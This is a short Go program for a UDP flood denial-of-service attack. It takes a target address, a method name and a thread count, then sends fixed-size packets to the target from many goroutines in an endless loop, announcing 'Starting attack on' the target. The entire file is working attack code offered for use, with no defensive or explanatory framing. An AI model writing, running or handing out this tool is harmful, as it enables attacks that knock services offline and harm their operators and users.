package main

import (
	"fmt"
	"net"
	"os"
	"strconv"
	"sync"
	"time"
	"runtime"
)

var wg sync.WaitGroup

func sendPacket(target string, amplifier int) {
	defer wg.Done()
	conn, err := net.Dial("udp", target)
	if err != nil {
		return
	}
	defer conn.Close()

	packet := make([]byte, amplifier)
	for i := range packet {
		packet[i] = 0x99
	}

	for {
		_, err := conn.Write(packet)
		if err != nil {
			break
		}
	}
}

func attack(target string, method string, threads int) {
	var amplifier int
	switch method {
	case "UDP-Flood":
		amplifier = 375
	case "UDP-Power":
		amplifier = 750
	case "UDP-Mix":
		amplifier = 562
	default:
		fmt.Println("Unknown method:", method)
		return
	}

	for i := 0; i < threads; i++ {
		wg.Add(1)
		go sendPacket(target, amplifier)
		time.Sleep(10 * time.Millisecond)
	}

	wg.Wait()
}

func main() {
	if len(os.Args) < 4 {
		fmt.Println("Usage: go run main.go <IP:PORT> <method> <threads>")
		return
	}

	target := os.Args[1]
	method := os.Args[2]
	threads, err := strconv.Atoi(os.Args[3])
	if err != nil {
		fmt.Println("Invalid number of threads")
		return
	}

	fmt.Printf("Starting attack on %s using %d threads...\n", target, threads)
	runtime.GOMAXPROCS(runtime.NumCPU()) 

	attack(target, method, threads)
}